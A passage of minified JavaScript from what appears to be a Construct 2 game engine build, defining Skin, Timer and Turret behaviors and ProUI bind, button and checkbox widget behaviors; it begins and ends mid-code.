this.hideDefault},t.cnds=new i,s.prototype.SetSkin=function(t){this.default&&(this.default=!1),this.skinTag=t,this.updateSkin()},s.prototype.SetSubSkin=function(t){this.subSkinTag=t,this.updateSkin()},s.prototype.Setup=function(t,e){this.default=!1,this.skinTag=t,this.subSkinTag=e,this.updateSkin()},s.prototype.UseDefault=function(){this.default=!0,this.updateSkin()},s.prototype.HideDefault=function(t){this.hideDefault=1===t,this.updateSkin()},s.prototype.SetImagePoint=function(t){this.imagePoint=t},s.prototype.SyncMode=function(t){this.syncWithAnim=0===t||2===t,this.syncWithFrame=1===t||2===t,this.syncWithAnim&&(this.subSkinTag=this.inst.cur_animation.name)},s.prototype.SyncZOrder=function(t){this.syncZOrder=0===t},s.prototype.UpdateZOrder=function(){this.object&&this.setZorder()},t.acts=new s,n.prototype.Skin=function(t){t.set_string(this.skinTag)},n.prototype.SubSkin=function(t){t.set_string(this.subSkinTag)},n.prototype.SkinBaseTag=function(t){t.set_string(this.skinBaseTag)},t.exps=new n}(),cr.behaviors.Timer=function(t){this.runtime=t},function(){var t=cr.behaviors.Timer.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.timers={}},e.onDestroy=function(){cr.wipe(this.timers)},e.saveToJSON=function(){var t,e,i={};for(t in this.timers)this.timers.hasOwnProperty(t)&&(e=this.timers[t],i[t]={c:e.current.sum,t:e.total.sum,d:e.duration,r:e.regular});return i},e.loadFromJSON=function(t){for(var e in this.timers={},t)t.hasOwnProperty(e)&&(this.timers[e]={current:new cr.KahanAdder,total:new cr.KahanAdder,duration:t[e].d,regular:t[e].r},this.timers[e].current.sum=t[e].c,this.timers[e].total.sum=t[e].t)},e.tick=function(){var t,e,i=this.runtime.getDt(this.inst);for(t in this.timers)this.timers.hasOwnProperty(t)&&((e=this.timers[t]).current.add(i),e.total.add(i))},e.tick2=function(){var t,e;for(t in this.timers)this.timers.hasOwnProperty(t)&&(e=this.timers[t]).current.sum>=e.duration&&(e.regular?e.current.sum-=e.duration:delete this.timers[t])},i.prototype.OnTimer=function(t){t=t.toLowerCase();t=this.timers[t];return!!t&&t.current.sum>=t.duration},t.cnds=new i,s.prototype.StartTimer=function(t,e,i){this.timers[i.toLowerCase()]={current:new cr.KahanAdder,total:new cr.KahanAdder,duration:t,regular:1===e}},s.prototype.StopTimer=function(t){t=t.toLowerCase(),this.timers.hasOwnProperty(t)&&delete this.timers[t]},t.acts=new s,n.prototype.CurrentTime=function(t,e){e=this.timers[e.toLowerCase()];t.set_float(e?e.current.sum:0)},n.prototype.TotalTime=function(t,e){e=this.timers[e.toLowerCase()];t.set_float(e?e.total.sum:0)},n.prototype.Duration=function(t,e){e=this.timers[e.toLowerCase()];t.set_float(e?e.duration:0)},t.exps=new n}(),cr.behaviors.Turret=function(t){this.runtime=t},function(){var t=cr.behaviors.Turret.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){this.targetTypes=[]},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;e.onCreate=function(){this.range=this.properties[0],this.rateOfFire=this.properties[1],this.rotateEnabled=0!==this.properties[2],this.rotateSpeed=cr.to_radians(this.properties[3]),this.targetMode=this.properties[4],this.predictiveAim=0!==this.properties[5],this.projectileSpeed=this.properties[6],this.enabled=0!==this.properties[7],this.useCollisionCells=0!==this.properties[8],this.lastCheckTime=0,this.fireTimeCount=this.rateOfFire,this.currentTarget=null,this.loadTargetUid=-1,this.oldTargetX=0,this.oldTargetY=0,this.lastSpeeds=[0,0,0,0],this.speedsCount=0,this.firstTickWithTarget=!0;var e=this;this.recycled||(this.myDestroyCallback=function(t){e.onInstanceDestroyed(t)}),this.runtime.addDestroyCallback(this.myDestroyCallback)},e.saveToJSON=function(){for(var t={r:this.range,rof:this.rateOfFire,re:this.rotateEnabled,rs:this.rotateSpeed,tm:this.targetMode,pa:this.predictiveAim,ps:this.projectileSpeed,en:this.enabled,lct:this.lastCheckTime,ftc:this.fireTimeCount,target:this.currentTarget?this.currentTarget.uid:-1,ox:this.oldTargetX,oy:this.oldTargetY,ls:this.lastSpeeds,sc:this.speedsCount,targs:[]},e=0,i=this.type.targetTypes.length;e<i;e++)t.targs.push(this.type.targetTypes[e].sid);return t},e.loadFromJSON=function(t){var e,i,s;for(this.range=t.r,this.rateOfFire=t.rof,this.rotateEnabled=t.re,this.rotateSpeed=t.rs,this.targetMode=t.tm,this.predictiveAim=t.pa,this.projectileSpeed=t.ps,this.enabled=t.en,this.lastCheckTime=t.lct,this.fireTimeCount=t.ftc||0,this.loadTargetUid=t.target,this.oldTargetX=t.ox,this.oldTargetY=t.oy,this.lastSpeeds=t.ls,this.speedsCount=t.sc,cr.clearArray(this.type.targetTypes),e=0,i=t.targs.length;e<i;e++)(s=this.runtime.getObjectTypeBySid(t.targs[e]))&&this.type.targetTypes.push(s)},e.afterLoad=function(){-1===this.loadTargetUid?this.currentTarget=null:this.currentTarget=this.runtime.getObjectByUID(this.loadTargetUid)},e.onInstanceDestroyed=function(t){this.currentTarget==t&&(this.currentTarget=null)},e.onDestroy=function(){this.currentTarget=null,this.runtime.removeDestroyCallback(this.myDestroyCallback)},e.addSpeed=function(t){this.speedsCount<4?(this.lastSpeeds[this.speedsCount]=t,this.speedsCount++):(this.lastSpeeds.shift(),this.lastSpeeds.push(t))},e.getSpeed=function(){for(var t=0,e=0;e<this.speedsCount;e++)t+=this.lastSpeeds[e];return t/this.speedsCount},e.isInRange=function(t){var e=this.inst,i=t.x-e.x,e=t.y-e.y;return i*i+e*e<=this.range*this.range};var a=new cr.rect(0,0,0,0),h=[];function i(){}function s(){}function n(){}e.lookForFirstTarget=function(){var t,e,i;if(a.left=this.inst.x-this.range,a.top=this.inst.y-this.range,a.right=this.inst.x+this.range,a.bottom=this.inst.y+this.range,this.useCollisionCells)this.runtime.getTypesCollisionCandidates(null,this.type.targetTypes,a,h);else for(t=0,e=this.type.targetTypes.length;t<e;++t)cr.appendArray(h,this.type.targetTypes[t].instances);for(t=0,e=h.length;t<e;++t)if(i=h[t],this.isInRange(i))return this.currentTarget=i,void cr.clearArray(h);cr.clearArray(h)},e.lookForNearestTarget=function(){var t,e,i,s,n=this.inst.x,r=this.inst.y,o=this.range*this.range;if(this.currentTarget=null,a.left=n-this.range,a.top=r-this.range,a.right=n+this.range,a.bottom=r+this.range,this.useCollisionCells)this.runtime.getTypesCollisionCandidates(null,this.type.targetTypes,a,h);else for(t=0,e=this.type.targetTypes.length;t<e;++t)cr.appendArray(h,this.type.targetTypes[t].instances);for(t=0,e=h.length;t<e;++t)(s=(s=n-(i=h[t]).x)*s+(s=r-i.y)*s)<o&&(this.currentTarget=i,o=s);h.length=0},e.tick=function(){var t,e,i,s,n,r,o,a,h=this.runtime.getDt(this.inst),c=this.runtime.kahanTime.sum,l=this.inst;this.enabled&&(this.currentTarget&&!this.isInRange(this.currentTarget)&&(this.currentTarget=null,this.speedsCount=0,this.firstTickWithTarget=!0),c>=this.lastCheckTime+.1&&(this.lastCheckTime=c,0!==this.targetMode||this.currentTarget?1===this.targetMode&&(r=this.currentTarget,this.lookForNearestTarget(),this.currentTarget&&this.currentTarget!==r&&(this.speedsCount=0,this.firstTickWithTarget=!0,this.oldTargetX=this.currentTarget.x,this.oldTargetY=this.currentTarget.y,this.runtime.trigger(cr.behaviors.Turret.prototype.cnds.OnTargetAcquired,this.inst))):(this.lookForFirstTarget(),this.currentTarget&&(this.speedsCount=0,this.firstTickWithTarget=!0,this.oldTargetX=this.currentTarget.x,this.oldTargetY=this.currentTarget.y,this.runtime.trigger(cr.behaviors.Turret.prototype.cnds.OnTargetAcquired,this.inst)))),this.fireTimeCount+=h,this.currentTarget&&(t=cr.angleTo(l.x,l.y,this.currentTarget.x,this.currentTarget.y),this.predictiveAim&&(e=l.x,i=l.y,s=this.currentTarget.x,a=this.currentTarget.y,n=cr.angleTo(s,a,this.oldTargetX,this.oldTargetY),this.firstTickWithTarget||this.addSpeed(cr.distanceTo(s,a,this.oldTargetX,this.oldTargetY)/h),o=a-i,c=s-e,a=((r=this.getSpeed())*Math.sin(n)*(e-s)-r*Math.cos(n)*(i-a))/this.projectileSpeed,c=Math.asin(a/Math.sqrt(o*o+c*c))-Math.atan2(o,-c)+Math.PI,isNaN(c)||(t=c)),this.rotateEnabled&&(l.angle=cr.angleRotate(l.angle,t,this.rotateSpeed*h),l.set_bbox_changed()),this.fireTimeCount>=this.rateOfFire&&(!this.rotateEnabled||cr.to_degrees(cr.angleDiff(l.angle,t))<=.1)&&(!this.predictiveAim||4<=this.speedsCount)&&(this.fireTimeCount-=this.rateOfFire,this.fireTimeCount>=this.rateOfFire&&(this.fireTimeCount=0),this.runtime.trigger(cr.behaviors.Turret.prototype.cnds.OnShoot,this.inst)),this.currentTarget&&(this.oldTargetX=this.currentTarget.x,this.oldTargetY=this.currentTarget.y),this.firstTickWithTarget=!1),this.fireTimeCount>this.rateOfFire&&(this.fireTimeCount=this.rateOfFire))},i.prototype.HasTarget=function(){return!!this.currentTarget},i.prototype.OnShoot=function(){return!0},i.prototype.OnTargetAcquired=function(){return!0},t.cnds=new i,s.prototype.AcquireTarget=function(t){if(t)for(var e,i=t.getCurrentSol().getObjects(),s=0,n=i.length;s<n;++s)if(e=i[s],this.currentTarget!==e&&this.isInRange(e)){this.currentTarget=e,this.speedsCount=0,this.firstTickWithTarget=!0,this.oldTargetX=this.currentTarget.x,this.oldTargetY=this.currentTarget.y,this.runtime.trigger(cr.behaviors.Turret.prototype.cnds.OnTargetAcquired,this.inst);break}},s.prototype.AddTarget=function(t){var e=this.type.targetTypes;if(-1===e.indexOf(t)){for(var i,s=0,n=e.length;s<n;s++)if((i=e[s]).is_family&&-1!==i.members.indexOf(t))return;e.push(t)}},s.prototype.ClearTargets=function(){cr.clearArray(this.type.targetTypes)},s.prototype.UnacquireTarget=function(){this.currentTarget=null,this.speedsCount=0,this.firstTickWithTarget=!0},s.prototype.SetEnabled=function(t){this.enabled=0!==t},s.prototype.SetRange=function(t){this.range=t},s.prototype.SetRateOfFire=function(t){this.rateOfFire=t},s.prototype.SetRotate=function(t){this.rotateEnabled=0!==t},s.prototype.SetRotateSpeed=function(t){this.rotateSpeed=cr.to_radians(t)},s.prototype.SetTargetMode=function(t){this.targetMode=t},s.prototype.SetPredictiveAim=function(t){this.predictiveAim=0!==t},s.prototype.SetProjectileSpeed=function(t){this.projectileSpeed=t},t.acts=new s,n.prototype.TargetUID=function(t){t.set_int(this.currentTarget?this.currentTarget.uid:0)},n.prototype.Range=function(t){t.set_float(this.range)},n.prototype.RateOfFire=function(t){t.set_float(this.rateOfFire)},n.prototype.RotateSpeed=function(t){t.set_float(cr.to_degrees(this.rotateSpeed))},t.exps=new n}(),cr.behaviors.aekiro_bind=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_bind.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.")};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.proui=cr.proui,this.isInstanceOfText=!!cr.plugins_.Text&&this.inst.type.plugin instanceof cr.plugins_.Text,this.isInstanceOfSpriteFont=!!cr.plugins_.Spritefont2&&this.inst.type.plugin instanceof cr.plugins_.Spritefont2,this.isInstanceOfSpriteFontPlus=!!cr.plugins_.SkymenSFPlusPLus&&this.inst.type.plugin instanceof cr.plugins_.SkymenSFPlusPLus,this.isInstanceOfSprite=!!cr.plugins_.Sprite&&this.inst.type.plugin instanceof cr.plugins_.Sprite,this.isInstanceOfPaster=!!cr.plugins_.rojoPaster&&this.inst.type.plugin instanceof cr.plugins_.rojoPaster,this.bind_key=this.properties[0],this.bind_property=this.properties[1],this.firstFrame=!0,(this.inst.proui_bind=this).index=-1,this.deepKey="",this.model=null},e.updateGridViewModel=function(t,e){this.model&&this.deepKey&&(console.log(this.deepKey+"***"+t),cr.plugins_.aekiro_model.prototype.acts.SetValueByKeyString.call(this.model,this.deepKey,t,e))},e.setValue=function(t){var e;this.bind_key&&(0==this.bind_property&&this.inst._proui&&this.inst._proui._setValue?this.inst._proui._setValue(t):1==this.bind_property&&(this.isInstanceOfText||this.isInstanceOfSpriteFont||this.isInstanceOfSpriteFontPlus)?this.inst.type.plugin.acts.SetText.call(this.inst,t):2==this.bind_property&&this.isInstanceOfSprite?(e=0,isNaN(t)||(e=parseInt(t)),this.inst.type.plugin.acts.SetAnimFrame.apply(this.inst,[e])):3==this.bind_property&&this.isInstanceOfSprite?(e=String(t),this.inst.type.plugin.acts.SetAnim.apply(this.inst,[e])):4==this.bind_property&&(this.isInstanceOfSprite||this.isInstanceOfPaster)&&this.inst.type.plugin.acts.LoadImage.call(this.inst,t,1))},e.tick=function(){},e.onDestroy=function(){},e.saveToJSON=function(){return{bind_key:this.bind_key,bind_property:this.bind_property}},e.loadFromJSON=function(t){this.bind_key=t.bind_key,this.bind_property=t.bind_property},i.prototype.IsIndex=function(t){return t==this.index},t.cnds=new i,t.acts=new function(){},s.prototype.index=function(t){t.set_int(this.index)},t.exps=new s}(),cr.behaviors.aekiro_button=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_button.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.");this.behavior.isHooked||(cr.proui.HookMe(this.behavior,["touch"]),this.behavior.isHooked=!0)};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.proui=cr.proui,this.proui.isTypeValid(this.inst,[cr.plugins_.Sprite,cr.plugins_.NinePatch,cr.plugins_.TiledBg],"Pro UI: Button behavior is only applicable to Sprite, 9-patch or tiled backgrounds objects."),this.isInstanceOfSprite=!!cr.plugins_.Sprite&&this.inst.type.plugin instanceof cr.plugins_.Sprite,this.isEnabled=this.properties[0],this.frame_hover=isNaN(parseInt(this.properties[1]))?-1:parseInt(this.properties[1]),this.frame_clicked=isNaN(parseInt(this.properties[2]))?-1:parseInt(this.properties[2]),this.frame_disabled=isNaN(parseInt(this.properties[3]))?-1:parseInt(this.properties[3]),this.clickSound=this.properties[4],this.clickAnimation=this.properties[5],this.hoverSound=this.properties[6],this.hoverAnimation=this.properties[7],this.callbackName=this.properties[8],this.callbackParams=this.properties[9],this.firstFrame=!0,this.uiType="button",this.inst.uiType="button",(this.inst._proui=this).state=0,this.onTouchStarted=!1,this.onMouseEnterFlag=!1,this.callbacks=[],this.onCreateInit()},e.onCreateInit=function(){this.setClickAnimations(),this.setHoverAnimations(),this.useStates=!0,this.frame_hover<0&&this.frame_clicked<0&&this.frame_disabled<0&&(this.useStates=!1)},e.setClickAnimations=function(){this.tween=new TWEEN.Tween(this.inst),1==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({width:1.2*this.inst.width,height:1.2*this.inst.height},200):2==this.clickAnimation?this.tween.easing(TWEEN.Easing.Elastic.Out).to({width:1.2*this.inst.width,height:1.2*this.inst.height},500):3==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y+this.inst.height/10},100):4==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y-this.inst.height/10},100):5==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x-this.inst.width/10},100):6==this.clickAnimation&&this.tween.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x+this.inst.width/10},100)},e.setHoverAnimations=function(){this.tween_hover=new TWEEN.Tween(this.inst),1==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({width:1.1*this.inst.width,height:1.1*this.inst.height},200):2==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Elastic.Out).to({width:1.1*this.inst.width,height:1.1*this.inst.height},500):3==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y+this.inst.height/10},100):4==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y-this.inst.height/10},100):5==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x-this.inst.width/13},100):6==this.hoverAnimation&&this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x+this.inst.width/13},100)},e.updateView=function(){this.useStates&&this.isInstanceOfSprite&&(this.isEnabled?2==this.state&&0<=this.frame_clicked?cr.plugins_.Sprite.prototype.acts.SetAnimFrame.call(this.inst,this.frame_clicked):1==this.state&&0<=this.frame_hover?cr.plugins_.Sprite.prototype.acts.SetAnimFrame.call(this.inst,this.frame_hover):0==this.state&&0<=this.frame_normal&&cr.plugins_.Sprite.prototype.acts.SetAnimFrame.call(this.inst,this.frame_normal):0<=this.frame_disabled?cr.plugins_.Sprite.prototype.acts.SetAnimFrame.call(this.inst,this.frame_disabled):this.isInsideScrollView||cr.plugins_.Sprite.prototype.acts.SetAnimFrame.call(this.inst,this.frame_normal))},e.OnTouchStart=function(){var t;this.isClickable()&&this.isInsideScrollView()&&!this.onTouchStarted&&((t=this.proui.scrollViews["l"+this.inst.layer.index])&&5<Math.sqrt(Math.pow(t.scroll.dx,2)+Math.pow(t.scroll.dy,2))||(this.onTouchStarted=!0,2!=this.state&&0<this.clickAnimation&&this.tween.start(),this.state=2,this.updateView(),this.clickSound&&this.proui.playAudio(this.clickSound)))},e.OnAnyTouchEnd=function(t,e){this.onTouchStarted&&this.OnTouchEnd(t,e),this.onTouchStarted=!1},e.OnTouchEnd=function(t,e){if(this.inst.update_bbox(),this.inst.contains_pt(t,e)){this.runtime.isMobile?this.state=0:this.state=1,this.updateView(),this.proui.runCallback(this.callbackName,this.callbackParams);for(var i=0,s=this.callbacks.length;i<s;i++)this.callbacks[i]();this.runtime.trigger(cr.behaviors.aekiro_button.prototype.cnds.OnClicked,this.inst)}else this.state=0,this.updateView();0<this.clickAnimation&&this.tween.reverse()},e.isMouseOver=function(){!this.onTouchStarted||(e=this.proui.scrollViews["l"+this.inst.layer.index])&&5<Math.sqrt(Math.pow(e.scroll.dx,2)+Math.pow(e.scroll.dy,2))&&(this.onTouchStarted=!1,this.state=0,this.updateView(),0<this.clickAnimation&&this.tween.reverse());var t=this.proui.CursorX(this.inst.layer.index),e=this.proui.CursorY(this.inst.layer.index);return this.inst.update_bbox(),this.inst.contains_pt(t,e)},e.OnMouseEnter=function(){this.isClickable()&&(this.state=1,this.updateView(),0<this.hoverAnimation&&this.tween_hover.start(),this.hoverSound&&this.proui.playAudio(this.hoverSound),this.runtime.trigger(cr.behaviors.aekiro_button.prototype.cnds.OnMouseEnter,this.inst))},e.OnMouseLeave=function(){this.state=0,this.updateView(),0<this.hoverAnimation&&this.tween_hover.reverse(),this.runtime.trigger(cr.behaviors.aekiro_button.prototype.cnds.OnMouseLeave,this.inst)},e.isInTouch=function(){var t=this.proui.X(this.inst.layer.index),e=this.proui.Y(this.inst.layer.index);return this.inst.update_bbox(),this.inst.contains_pt(t,e)},e.setEnabled=function(t){this.isEnabled=t,this.updateView()},e.isInsideScrollView=function(){var t,e,i=!0,s=this.proui.scrollViews["l"+this.inst.layer.index];return s&&(e=this.runtime.isMobile?(t=this.proui.X(this.inst.layer.index),this.proui.Y(this.inst.layer.index)):(t=this.proui.CursorX(this.inst.layer.index),this.proui.CursorY(this.inst.layer.index)),s.inst.update_bbox(),i=s.inst.contains_pt(t,e)),i},e.isClickable=function(){for(var t=this.inst.layer.visible&&this.inst.visible,e=!1,i=0,s=this.proui.currentDialogs.length;i<s;i++)if(this.inst.layer.index<this.proui.currentDialogs[i].inst.layer.index){e=!0;break}return t&&this.isEnabled&&!e},e.tick=function(){var t;this.firstFrame&&(this.firstFrame=!1,this.useStates&&(this.inst.cur_anim_speed=0),this.frame_normal=this.inst.cur_frame,this.updateView(),this.lastY=this.proui.CursorY(this.inst.layer.index),this.lastX=this.proui.CursorX(this.inst.layer.index)),this.tween.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween.update(t),this.inst.set_bbox_changed()),this.tween_hover.isPlaying&&(t=1e3*this.runtime.getDt(this.inst),this.tween_hover.update(t),this.inst.set_bbox_changed()),this.isClickable()&&(this.isMouseOver()&&this.isInsideScrollView()?!this.onMouseEnterFlag&&(10<Math.abs(this.lastY-this.proui.CursorY(this.inst.layer.index))||10<Math.abs(this.lastX-this.proui.CursorX(this.inst.layer.index)))&&(this.onMouseEnterFlag=!0,this.OnMouseEnter(),this.lastY=this.proui.CursorY(this.inst.layer.index),this.lastX=this.proui.CursorX(this.inst.layer.index)):this.onMouseEnterFlag&&(!this.isInsideScrollView()||10<Math.abs(this.lastY-this.proui.CursorY(this.inst.layer.index))||10<Math.abs(this.lastX-this.proui.CursorX(this.inst.layer.index)))&&(this.onMouseEnterFlag=!1,this.OnMouseLeave(),this.lastY=this.proui.CursorY(this.inst.layer.index),this.lastX=this.proui.CursorX(this.inst.layer.index)))},e.onDestroy=function(){},e.saveToJSON=function(){return{isEnabled:this.isEnabled,clickSound:this.clickSound,clickAnimation:this.clickAnimation,hoverSound:this.hoverSound,hoverAnimation:this.hoverAnimation,callbackName:this.callbackName,callbackParams:this.callbackParams,frame_hover:this.frame_hover,frame_clicked:this.frame_clicked,frame_disabled:this.frame_disabled}},e.loadFromJSON=function(t){this.isEnabled=t.isEnabled,this.clickSound=t.clickSound,this.clickAnimation=t.clickAnimation,this.hoverSound=t.hoverSound,this.hoverAnimation=t.hoverAnimation,this.callbackName=t.callbackName,this.callbackParams=t.callbackParams,this.frame_hover=t.frame_hover,this.frame_clicked=t.frame_clicked,this.frame_disabled=t.frame_disabled,this.onCreateInit()},i.prototype.OnMouseEnter=function(){return!0},i.prototype.OnMouseLeave=function(){return!0},i.prototype.OnClicked=function(){return!0},i.prototype.IsEnabled=function(){return this.isEnabled},t.cnds=new i,s.prototype.setEnabled=function(t){this.setEnabled(t)},t.acts=new s,t.exps=new function(){}}(),cr.behaviors.aekiro_checkbox=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_checkbox.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.");this.behavior.isHooked||(cr.proui.HookMe(this.behavior,["touch"]),this.behavior.isHooked=!0)};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.proui=cr.proui,this.proui.isTypeValid(this.inst,[cr.plugins_.Sprite],"Pro UI: Checkbox behavior is only applicable to Sprite objects."),this.isEnabled=this.properties[0],this.value=this.properties[1],this.frames_normal=this.properties[2],this.frames_hover=this.properties[3],this.frames_disabled=this.properties[4],this.clickSound=this.properties[5],this.clickAnimation=this.properties[6],this.hoverSound=this.properties[7],this.hoverAnimation=this.properties[8],this.callbackName=this.properties[9],this.callbackParams=this.properties[10],this.firstFrame=!0,this.uiType="checkbox",this.inst.uiType="checkbox",(this.inst._proui=this).firstSetValue=!1,this.state=0,this.onTouchStarted=!1,this.onMouseEnterFlag=!1,(this.compParent=this).onCreateInit()},e.onCreateInit=function(){this.setFrames(),this.setClickAnimations(),this.setHoverAnimations()},e.setFrames=function(){var t=this.frames_normal.split(",");this.frame_normal_uncheck=isNaN(parseInt(t[0]))?-1:parseInt(t[0]),this.frame_normal_check=isNaN(parseInt(t[1]))?-1:parseInt(t[1]);t=this.frames_hover.split(",");this.frame_hover_uncheck=isNaN(parseInt(t[0]))?-1:parseInt(t[0]),this.frame_hover_check=isNaN(parseInt(t[1]))?-1:parseInt(t[1]);t=this.frames_disabled.split(",");this.frame_disabled_uncheck=isNaN(parseInt(t[0]))?-1:parseInt(t[0]),this.frame_disabled_check=isNaN(parseInt(t[1]))?-1:parseInt(t[1])},e.setClickAnimations=function(){this.tween=new TWEEN.Tween(this.inst),1==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({width:1.2*this.inst.width,height:1.2*this.inst.height},200):2==this.clickAnimation?this.tween.easing(TWEEN.Easing.Elastic.Out).to({width:1.2*this.inst.width,height:1.2*this.inst.height},500):3==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y+this.inst.height/10},100):4==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y-this.inst.height/10},100):5==this.clickAnimation?this.tween.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x-this.inst.width/10},100):6==this.clickAnimation&&this.tween.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x+this.inst.width/10},100)},e.setHoverAnimations=function(){this.tween_hover=new TWEEN.Tween(this.inst),1==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({width:1.1*this.inst.width,height:1.1*this.inst.height},200):2==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Elastic.Out).to({width:1.1*this.inst.width,height:1.1*this.inst.height},500):3==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y+this.inst.height/10},100):4==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({y:this.inst.y-this.inst.height/10},100):5==this.hoverAnimation?this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x-this.inst.width/13},100):6==this.hoverAnimation&&this.tween_hover.easing(TWEEN.Easing.Quadratic.Out).to({x:this.inst.x+this.inst.width/13},100)},e.setValue=function(t){var e;this.firstSetValue=!0,this._setValue(t)&&((e=this.inst.proui_model)&&e.setModelValue(t,{except:this.compParent}),this.inst.proui_bind&&this.inst.proui_bind.updateGridViewModel(t,{except:this.compParent}))},e._setValue=function(t){return null!=t&&(t=this.proui.validateSimpleValue(t,0),t=cr.clamp(t,0,1),this.value!=t&&(this.value=t,this.updateView(),!0))},e.updateFromModel=function(){var t=this.inst.proui_model;!t||null!=(t=t.getFromModel())&&(t=this.proui.validateSimpleValue(t,0),t=cr.clamp(t,0,1),this.value!=t&&(this.value=t))},e.updateView=function(){this.value?(cr.plugins_.Sprite.prototype.acts.SetAnimFrame.apply(this.inst,[this.frame_normal_check]),this.isEnabled?1==this.state&&0<=this.frame_hover_check&&cr.plugins_.Sprite.prototype.acts.SetAnimFrame.apply(this.inst,[this.frame_hover_check]):0<=this.frame_disabled_check&&cr.plugins_.Sprite.prototype.acts.SetAnimFrame.apply(this.inst,[this.frame_disabled_check])):(cr.plugins_.Sprite.prototype.acts.SetAnimFrame.apply(this.inst,[this.frame_normal_uncheck]),this.isEnabled?1==this.state&&0<=this.frame_hover_uncheck&&cr.plugins_.Sprite.prototype.acts.SetAnimFrame.apply(this.inst,[this.frame_hover_uncheck]):0<=this.frame_disabled_uncheck&&cr.plugins_.Sprite.prototype.acts.SetAnimFrame.apply(this.inst,[this.frame_disabled_uncheck]))},e.setEnabled=function(t){this.isEnabled=t,this.updateView()},e.OnTouchStart=function(){var t;this.isClickable()&&this.isInsideScrollView()&&!this.onTouchStarted&&((t=this.proui.scrollViews["l"+this.inst.layer.index])&&5<Math.sqrt(Math.pow(t.scroll.dx,2)+Math.pow(t.scroll.dy,2))||(this.onTouchStarted=!0,2!=this.state&&0<this.clickAnimation&&this.tween.start(),this.state=2,this.clickSound&&this.proui.playAudio(this.clickSound)))},e.OnAnyTouchEnd=function(t,e){this.onTouchStarted&&this.OnTouchEnd(t,e),this.onTouchStarted=!1},e.OnTouchEnd=function(t,e){this.inst.update_bbox(),this.inst.contains_pt(t,e)?(this.runtime.isMobile?this.state=0:this.state=1,this.setValue(1-this.value),this.updateView(),this.proui.runCallback(this.callbackName,this.callbackParams),this.runtime.trigger(cr.behaviors.aekiro_checkbox.prototype.cnds.OnClicked,this.inst)):(this.state=0,this.updateView()),0<this.clickAnimation&&this.tween.reverse()},e.isMouseOver=function(){!this.onTouchStarted||(e=this.proui.scrollViews["l"+this.inst.layer.index])&&5<Math.sqrt(Math.pow(e.scroll.dx,2)+Math.pow(e.scroll.dy,2))&&(this.onTouchStarted=!1,this.state=0,this.updateView(),0<this.clickAnimation&&this.tween.reverse());var t=this.proui.CursorX(this.inst.layer.index),e=this.proui.CursorY(this.inst.layer.index);return this.inst.update_bbox(),this.inst.contains_pt(t,e)},e.OnMouseEnter=function(){this.isClickable()&&(this.state=1,this.updateView(),0<this.hoverAnimation&&this.tween_hover.start(),this.hoverSound&&this.proui.playAudio(this.hoverSound),this.runtime.trigger(cr.behaviors.aekiro_checkbox.prototype.cnds.OnMouseEnter,this.inst))},e.OnMouseLeave=function(){this.state=0,this.updateView(),0<this.hoverAnimation&&this.tween_hover.reverse(),this.runtime.trigger(cr.behaviors.aekiro_checkbox.prototype.cnds.OnMouseLeave,this.inst)},e.isInTouch=function(){var t=this.proui.X(this.inst.layer.index),e=this.proui.Y(this.inst.layer.index);return this.inst.update_bbox(),this.inst.contains_pt(t,e)},e.isInsideScrollView=function(){var 